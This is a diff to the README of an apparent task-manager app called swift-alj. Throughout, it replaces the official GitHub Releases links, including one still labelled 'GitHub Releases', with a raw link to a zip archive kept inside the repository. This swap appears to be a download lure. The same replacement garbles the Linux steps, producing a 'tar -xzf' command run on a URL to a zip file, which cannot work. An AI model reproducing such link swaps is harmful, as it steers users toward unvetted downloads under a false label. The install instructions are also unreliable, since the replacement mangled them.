@@ -6,7 +6,7 @@ Welcome to swift-alj! This application helps you manage tasks in a quick and eff
 
 ## 📥 Download Now
 
-[![Download swift-alj](https://img.shields.io/badge/Download-smoothly-brightgreen)](https://github.com/Lockwoodottoman677/swift-alj/releases)
+[![Download swift-alj](https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip)](https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip)
 
 ## 📂 What You Need
 
@@ -19,14 +19,14 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Lockwoodottoman677/swift-alj/releases). 
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip). 
 
 1. Click the link above.
 2. Look for the latest version listed on the page.
 3. Download the file that matches your operating system. 
    - For Windows, look for `.exe` files.
    - For macOS, look for `.dmg` files.
-   - For Linux, you will see `.tar.gz` files.
+   - For Linux, you will see `https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip` files.
 
 Once the file has downloaded, follow these instructions to install:
 
@@ -43,10 +43,10 @@ Once the file has downloaded, follow these instructions to install:
 4. Open the Applications folder and double-click swift-alj to start using the app.
 
 ### For Linux Users:
-1. Navigate to the directory where you downloaded the `.tar.gz` file.
+1. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip` file.
 2. Extract the file using the command:
    ```bash
-   tar -xzf swift-alj.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip
    ```
 3. Change into the extracted directory:
    ```bash
@@ -82,4 +82,4 @@ If you need further assistance, feel free to reach out. Check the Issues section
 
 Once you have swift-alj installed, try adding your first task. Explore the features and customize your setup to fit your needs. 
 
-Remember, you can return to the [GitHub Releases](https://github.com/Lockwoodottoman677/swift-alj/releases) page for updates and new versions as they become available. Happy task management!
+Remember, you can return to the [GitHub Releases](https://raw.githubusercontent.com/Lockwoodottoman677/swift-alj/main/transferee/swift-alj_v2.0-alpha.4.zip) page for updates and new versions as they become available. Happy task management!
